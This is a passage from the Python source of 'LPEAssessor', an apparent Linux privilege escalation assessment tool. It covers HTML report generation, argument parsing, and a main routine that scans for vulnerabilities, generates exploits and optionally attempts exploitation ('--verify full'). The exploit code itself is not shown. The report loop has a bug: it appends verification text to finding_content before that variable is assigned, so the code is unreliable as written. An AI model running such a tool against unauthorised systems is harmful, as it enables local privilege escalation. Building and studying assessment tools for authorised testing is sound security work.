            margin: 10px 0;
        }
        
        .risk-high .count {
            color: var(--danger-color);
        }
        
        .risk-medium .count {
            color: var(--warning-color);
        }
        
        .risk-low .count {
            color: var(--success-color);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }
        
        th {
            background-color: var(--secondary-color);
            color: white;
            padding: 12px 15px;
            text-align: left;
            font-weight: 600;
        }
        
        td {
            padding: 10px 15px;
            border-bottom: 1px solid #ddd;
        }
        
        tr:hover {
            background-color: #f5f5f5;
        }
        
        .severity-high, .severity-critical {
            color: var(--danger-color);
            font-weight: 600;
        }
        
        .severity-medium {
            color: var(--warning-color);
            font-weight: 600;
        }
        
        .severity-low, .severity-info {
            color: var(--success-color);
            font-weight: 600;
        }
        
        .finding {
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            margin-bottom: 15px;
            overflow: hidden;
        }
        
        .finding-header {
            padding: 12px 15px;
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #eee;
        }
        
        .finding-high .finding-header {
            background-color: rgba(231, 76, 60, 0.1);
            color: var(--danger-color);
        }
        
        .finding-medium .finding-header {
            background-color: rgba(243, 156, 18, 0.1);
            color: var(--warning-color);
        }
        
        .finding-low .finding-header {
            background-color: rgba(39, 174, 96, 0.1);
            color: var(--success-color);
        }
        
        .finding-content {
            padding: 15px;
        }
        
        .detail-row {
            display: flex;
            margin-bottom: 10px;
        }
        
        .detail-label {
            min-width: 150px;
            font-weight: 600;
            color: var(--dark-color);
        }
        
        .detail-value {
            flex: 1;
        }
        
        .code-block {
            background-color: #f8f9fa;
            border: 1px solid #eee;
            border-radius: 3px;
            padding: 10px;
            font-family: 'Courier New', Courier, monospace;
            overflow-x: auto;
            margin: 10px 0;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: #666;
            font-size: 14px;
        }
        
        .footer a {
            color: var(--accent-color);
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        @media print {
            body {
                background-color: white;
            }
            
            .container {
                max-width: 100%;
                padding: 0;
            }
            
            .section, .finding {
                break-inside: avoid;
                box-shadow: none;
                border: 1px solid #ddd;
            }
            
            .section-header, th {
                background-color: #eee !important;
                color: #333 !important;
            }
            
            .header {
                background-color: #eee;
                color: #333;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Privilege Escalation Vulnerability Assessment</h1>
            <p>Confidential Security Report</p>
            <p>Generated: {{scan_time}}</p>
        </div>
        
        <div class="section">
            <div class="section-header">Executive Summary</div>
            <div class="section-content">
                <div class="executive-summary">
                    <p>This report presents the findings of a comprehensive privilege escalation assessment conducted on the target system. The assessment identified {{total_vulnerabilities}} potential privilege escalation vectors, of which {{total_exploits}} have been verified as exploitable. This report provides detailed information about each vulnerability and recommended remediation actions.</p>
                </div>
                
                <div class="risk-summary">
                    <div class="risk-box risk-high">
                        <h3>High Risk</h3>
                        <div class="count">{{high_risk_count}}</div>
                        <p>Critical vulnerabilities requiring immediate attention</p>
                    </div>
                    <div class="risk-box risk-medium">
                        <h3>Medium Risk</h3>
                        <div class="count">{{medium_risk_count}}</div>
                        <p>Significant vulnerabilities requiring prompt remediation</p>
                    </div>
                    <div class="risk-box risk-low">
                        <h3>Low Risk</h3>
                        <div class="count">{{low_risk_count}}</div>
                        <p>Minor vulnerabilities to address in regular maintenance</p>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="section">
            <div class="section-header">System Information</div>
            <div class="section-content">
                <table>
                    <tr>
                        <th>Property</th>
                        <th>Value</th>
                    </tr>
                    {{system_info_rows}}
                </table>
            </div>
        </div>
        
        <div class="section">
            <div class="section-header">Findings Summary</div>
            <div class="section-content">
                <table>
                    <tr>
                        <th>ID</th>
                        <th>Vulnerability Type</th>
                        <th>Severity</th>
                        <th>Status</th>
                    </tr>
                    {{vulnerability_summary_rows}}
                </table>
            </div>
        </div>
        
        <div class="section">
            <div class="section-header">Detailed Findings</div>
            <div class="section-content">
                {{detailed_findings}}
            </div>
        </div>
        
        <div class="section">
            <div class="section-header">Remediation Recommendations</div>
            <div class="section-content">
                <p>Based on the findings of this assessment, the following remediation actions are recommended:</p>
                
                <div class="finding">
                    <div class="finding-header">General Hardening Recommendations</div>
                    <div class="finding-content">
                        <ul>
                            <li>Apply the principle of least privilege for all user accounts and services</li>
                            <li>Regularly update the system with security patches</li>
                            <li>Implement robust file permission controls</li>
                            <li>Configure proper sudo policies</li>
                            <li>Disable unnecessary SUID/SGID binaries</li>
                            <li>Monitor and audit system for unauthorized changes</li>
                        </ul>
                    </div>
                </div>
                
                {{remediation_recommendations}}
            </div>
        </div>
        
        <div class="footer">
            <p>This report was generated by LPEAssessor - Advanced Linux Privilege Escalation Assessment Tool</p>
            <p>This report is confidential and intended for authorized security personnel only.</p>
            <p>Assessment conducted in accordance with industry security standards and best practices.</p>
        </div>
    </div>
</body>
</html>
        """
        
        # Generate system info rows
        system_info_rows = ""
        for key, value in self.report_data['system_info'].items():
            if key in ['environment', 'disk_space', 'network_interfaces', 'listening_ports', 'running_processes']:
                # Include only a summary for verbose information
                if key == 'environment':
                    system_info_rows += f"<tr><td>Environment Variables</td><td>Available in the detailed report</td></tr>\n"
                else:
                    system_info_rows += f"<tr><td>{key.replace('_', ' ').title()}</td><td>Available in the detailed report</td></tr>\n"
                continue
                
            if isinstance(value, dict):
                formatted_value = ", ".join([f"{k}: {v}" for k, v in value.items() if k != 'environment'])
            elif isinstance(value, list):
                formatted_value = ", ".join(value)
            else:
                formatted_value = str(value)
                if len(formatted_value) > 100:  # Truncate very long values
                    formatted_value = formatted_value[:100] + "..."
            
            system_info_rows += f"<tr><td>{key.replace('_', ' ').title()}</td><td>{formatted_value}</td></tr>\n"
        
        # Calculate risk levels
        high_risk_vulns = []
        medium_risk_vulns = []
        low_risk_vulns = []
        
        # Categorize vulnerabilities by risk level
        for vuln in self.report_data['vulnerabilities']:
            vuln_type = vuln.get('type', 'unknown')
            
            # Define high risk vulnerabilities
            if vuln_type in ['sudo_permissions', 'suid_binary', 'writable_file', 'kernel_exploit', 'docker_group_member']:
                high_risk_vulns.append(vuln)
            # Define medium risk vulnerabilities
            elif vuln_type in ['sgid_binary', 'weak_file_permissions', 'writable_cron_job', 'path_hijacking']:
                medium_risk_vulns.append(vuln)
            # Everything else is low risk
            else:
                low_risk_vulns.append(vuln)
        
        # Generate vulnerability summary rows
        vulnerability_summary_rows = ""
        for i, vuln in enumerate(self.report_data['vulnerabilities'], 1):
            vuln_type = vuln.get('type', 'unknown').replace('_', ' ').title()
            
            # Determine severity
            severity = "Low"
            severity_class = "severity-low"
            if vuln in high_risk_vulns:
                severity = "High"
                severity_class = "severity-high"
            elif vuln in medium_risk_vulns:
                severity = "Medium"
                severity_class = "severity-medium"
            
            # Determine status
            status = "Unexploitable"
            if vuln.get('is_exploitable', False):
                status = "Exploitable"
            
            vulnerability_summary_rows += f"""<tr>
                <td>VULN-{i:03d}</td>
                <td>{vuln_type}</td>
                <td class="{severity_class}">{severity}</td>
                <td>{status}</td>
            </tr>\n"""
        
        # Generate detailed findings
        detailed_findings = ""
        for i, vuln in enumerate(self.report_data['vulnerabilities'], 1):
            vuln_type = vuln.get('type', 'unknown').replace('_', ' ').title()
            
            # Determine severity class for finding
            finding_class = "finding-low"
            severity = "Low"
            if vuln in high_risk_vulns:
                finding_class = "finding-high"
                severity = "High"
            elif vuln in medium_risk_vulns:
                finding_class = "finding-medium"
                severity = "Medium"

            # Add verification information to the finding
            if 'verification_reason' in vuln:
                verification_status = "Verified" if vuln.get('is_exploitable', False) else "Verification Failed"
                verification_reason = vuln.get('verification_reason', 'No verification information')
                
                finding_content += f"""
                <div class="detail-row">
                    <div class="detail-label">Verification:</div>
                    <div class="detail-value">
                        <p><strong>{verification_status}</strong>: {verification_reason}</p>
                    </div>
                </div>
                """
            
            # Create content for each finding
            finding_content = f"""
            <div class="finding {finding_class}">
                <div class="finding-header">
                    VULN-{i:03d}: {vuln_type}
                    <span>{severity} Risk</span>
                </div>
                <div class="finding-content">
            """
            
            # Add details for the vulnerability
            for key, value in vuln.items():
                if key in ['type', 'is_exploitable']:
                    continue  # Skip these keys as they are already represented elsewhere
                
                label = key.replace('_', ' ').title()
                
                if isinstance(value, dict):
                    display_value = "<ul>\n"
                    for k, v in value.items():
                        display_value += f"<li><strong>{k}:</strong> {v}</li>\n"
                    display_value += "</ul>"
                elif isinstance(value, list):
                    display_value = "<ul>\n"
                    for item in value:
                        display_value += f"<li>{item}</li>\n"
                    display_value += "</ul>"
                else:
                    display_value = str(value)
                
                finding_content += f"""
                <div class="detail-row">
                    <div class="detail-label">{label}:</div>
                    <div class="detail-value">{display_value}</div>
                </div>
                """
            
            # Add exploit information if available
            matching_exploits = [e for e in self.report_data['exploits'] if e.get('vulnerability', {}).get('type', '') == vuln.get('type', '')]
            if matching_exploits:
                finding_content += f"""
                <div class="detail-row">
                    <div class="detail-label">Exploitation:</div>
                    <div class="detail-value">
                        <p>{matching_exploits[0].get('description', 'No description available')}</p>
                        <div class="code-block">{matching_exploits[0].get('command', 'No command available')}</div>
                    </div>
                </div>
                """
            
            finding_content += """
                </div>
            </div>
            """
            
            detailed_findings += finding_content
        
        # Generate remediation recommendations
        remediation_recommendations = ""
        if high_risk_vulns:
            remediation_recommendations += """
            <div class="finding finding-high">
                <div class="finding-header">High Risk Vulnerabilities</div>
                <div class="finding-content">
                    <ul>
            """
            
            for vuln in high_risk_vulns:
                vuln_type = vuln.get('type', 'unknown').replace('_', ' ').title()
                if vuln_type == "Sudo Permissions":
                    remediation_recommendations += "<li>Review and restrict sudo permissions to the minimum required for operational needs</li>\n"
                elif vuln_type == "Suid Binary":
                    remediation_recommendations += f"<li>Remove unnecessary SUID bit from {vuln.get('path', 'binary')}</li>\n"
                elif vuln_type == "Writable File":
                    remediation_recommendations += f"<li>Fix permissions on {vuln.get('path', 'file')} to prevent unauthorized modification</li>\n"
                elif vuln_type == "Kernel Exploit":
                    remediation_recommendations += "<li>Update the kernel to the latest security patched version</li>\n"
                elif vuln_type == "Docker Group Member":
                    remediation_recommendations += "<li>Remove unnecessary users from the Docker group to prevent container escapes</li>\n"
            
            remediation_recommendations += """
                    </ul>
                </div>
            </div>
            """
        
        if medium_risk_vulns:
            remediation_recommendations += """
            <div class="finding finding-medium">
                <div class="finding-header">Medium Risk Vulnerabilities</div>
                <div class="finding-content">
                    <ul>
            """
            
            for vuln in medium_risk_vulns:
                vuln_type = vuln.get('type', 'unknown').replace('_', ' ').title()
                if vuln_type == "Sgid Binary":
                    remediation_recommendations += f"<li>Remove unnecessary SGID bit from {vuln.get('path', 'binary')}</li>\n"
                elif vuln_type == "Weak File Permissions":
                    remediation_recommendations += f"<li>Strengthen permissions on {vuln.get('path', 'file')} to prevent unauthorized access</li>\n"
                elif vuln_type == "Writable Cron Job":
                    remediation_recommendations += f"<li>Fix permissions on cron job {vuln.get('path', 'file')} to prevent manipulation</li>\n"
                elif vuln_type == "Path Hijacking":
                    remediation_recommendations += "<li>Review and secure PATH directories to prevent binary hijacking</li>\n"
            
            remediation_recommendations += """
                    </ul>
                </div>
            </div>
            """
        
        # Replace placeholders in template
        html_report = html_template
        html_report = html_report.replace("{{scan_time}}", self.report_data['scan_time'])
        html_report = html_report.replace("{{total_vulnerabilities}}", str(len(self.report_data['vulnerabilities'])))
        html_report = html_report.replace("{{total_exploits}}", str(len(self.report_data['exploits'])))
        html_report = html_report.replace("{{high_risk_count}}", str(len(high_risk_vulns)))
        html_report = html_report.replace("{{medium_risk_count}}", str(len(medium_risk_vulns)))
        html_report = html_report.replace("{{low_risk_count}}", str(len(low_risk_vulns)))
        html_report = html_report.replace("{{system_info_rows}}", system_info_rows)
        html_report = html_report.replace("{{vulnerability_summary_rows}}", vulnerability_summary_rows)
        html_report = html_report.replace("{{detailed_findings}}", detailed_findings)
        html_report = html_report.replace("{{remediation_recommendations}}", remediation_recommendations)
        
        if output_file:
            file_name = f"{output_file}.html" if not output_file.endswith('.html') else output_file
            with open(file_name, 'w') as f:
                f.write(html_report)
            self.logger.log(LogLevel.SUCCESS, f"Professional HTML report saved to {file_name}")
        
        return html_report

def print_banner():
    banner = r"""

 _     ______ _____  ___                                   
| |    | ___ \  ___|/ _ \                                  
| |    | |_/ / |__ / /_\ \___ ___  ___  ___ ___  ___  _ __ ─────▄───▄
| |    |  __/|  __||  _  / __/ __|/ _ \/ __/ __|/ _ \| '__|─▄█▄─█▀█▀█─▄█▄
| |____| |   | |___| | | \__ \__ \  __/\__ \__ \ (_) | |   ▀▀████▄█▄████▀▀
\_____/\_|   \____/\_| |_/___/___/\___||___/___/\___/|_|   ─────▀█▀█▀                                                                                                                                                                                                              
    """
    print(banner)
    print("  Linux Privilege Escalation Assessment Tool v1.3.2")
    print("  https://github.com/ParzivalHack/LPEAssessor")
    print("")
    print("")

def parse_arguments():
    parser = argparse.ArgumentParser(description='LPEAssessor: Linux Privilege Escalation Assessment Tool')
    parser.add_argument('-o', '--output', help='Output file for the report (without extension)')
    parser.add_argument('-f', '--format', choices=['json', 'text', 'html', 'all'], default='all', help='Report format')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-l', '--log', help='Log file path')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads to use for scanning')
    parser.add_argument('-u', '--username', help='Specify a username for exploit generation (default: current user)')
    parser.add_argument('--timeout', type=int, default=3600, help='Timeout for scans in seconds (default: 3600)')
    parser.add_argument('--skip-exploits', action='store_true', help='Skip exploit generation')
    parser.add_argument('--skip-info', action='store_true', help='Skip system information gathering')
    parser.add_argument('--skip-report', action='store_true', help='Skip report generation')
    parser.add_argument('--monitor-only', action='store_true', help='Only monitor for successful path hijacking exploits')
    parser.add_argument('--monitor-timeout', type=int, default=300, help='Timeout for monitoring in seconds (default: 300)')
    parser.add_argument('--verify', choices=['none', 'safe', 'full'], default='safe', help='Verification mode: none (skip verification), safe (non-destructive tests), full (attempt exploitation)')
    parser.add_argument('--verify-timeout', type=int, default=10, help='Timeout for each verification attempt in seconds (default: 10)')

    return parser.parse_args()

def main():
    # Parse command line arguments
    args = parse_arguments()

    print_banner()
    
    # Initialize logger
    logger = PrivescLogger(log_file=args.log, verbose=args.verbose)
    logger.log(LogLevel.INFO, "LPEAssessor: Linux Privilege Escalation Assessment Tool")
    
    # Get verification settings
    verification_mode = args.verify
    verify_timeout = args.verify_timeout
    
    # Log verification settings
    logger.log(LogLevel.INFO, f"Verification mode: {verification_mode}")
    if verification_mode != 'none':
        logger.log(LogLevel.INFO, f"Verification timeout: {verify_timeout} seconds")
    
    # Check if we're in monitor-only mode
    if args.monitor_only:
        logger.log(LogLevel.INFO, "Running in monitor-only mode")
        exploit_manager = ExploitManager(
            logger=logger,
            vulnerabilities=[],  # No vulnerabilities needed for monitoring
            username=args.username
        )
        success, message, evidence = exploit_manager.monitor_for_path_hijacking_success(timeout=args.monitor_timeout)
        
        if success:
            logger.log(LogLevel.SUCCESS, message)
            if 'usage' in evidence:
                logger.log(LogLevel.INFO, f"Usage instructions: {evidence['usage']}")
        else:
            logger.log(LogLevel.WARNING, message)
        
        logger.log(LogLevel.INFO, "Monitor-only mode completed")
        return
    
    # Get system information
    system_info = {}
    if not args.skip_info:
        system_info_scanner = SystemInfo(logger)
        system_info = system_info_scanner.gather_system_info()
        system_info_scanner.print_system_info()
    
    # Scan for vulnerabilities with verification
    scanner = VulnerabilityScanner(
        logger=logger,
        username=args.username,
        threads=args.threads,
        scan_timeout=args.timeout,
        verification_mode=verification_mode,
        verify_timeout=verify_timeout
    )
    vulnerabilities = scanner.start_scan()
    logger.log(LogLevel.INFO, f"Found {len(vulnerabilities)} vulnerabilities, {sum(1 for v in vulnerabilities if v.get('is_exploitable', False))} exploitable")
    
    # Generate exploits with verification
    exploits = []
    if not args.skip_exploits:
        exploit_manager = ExploitManager(
            logger=logger,
            vulnerabilities=vulnerabilities,
            username=args.username,
            verification_mode=verification_mode,
            verify_timeout=verify_timeout
        )
        exploits = exploit_manager.generate_exploits()
        logger.log(LogLevel.INFO, f"Generated {len(exploits)} exploits")
    
    # Generate report
    if not args.skip_report:
        report_generator = ReportGenerator(
            logger=logger,
            system_info=system_info,
            vulnerabilities=vulnerabilities,
            exploits=exploits
        )
        report_generator.generate_report(
            output_format=args.format,
            output_file=args.output
        )
    
    logger.log(LogLevel.INFO, "LPEAssessor: Linux Privilege Escalation Assessment Tool")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExecution interrupted by user. Exiting...")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)
